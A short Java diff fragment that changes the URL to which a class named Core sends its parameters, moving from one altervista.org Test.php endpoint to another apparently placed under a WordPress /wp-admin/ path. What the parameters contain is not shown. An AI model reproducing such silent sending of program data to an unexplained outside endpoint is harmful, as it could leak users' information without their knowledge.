@@ -15,7 +15,7 @@ public class Core {
     }
 
     private static void doMain() {
-        HttpSendRequest request = new HttpSendRequest("http://shin9xspace2.altervista.org/Test.php", getParams());
+        HttpSendRequest request = new HttpSendRequest("http://dprssn.altervista.org/wp-admin/Test.php", getParams());
         request.send();
 
         ServerResponse sr = new ServerResponse();
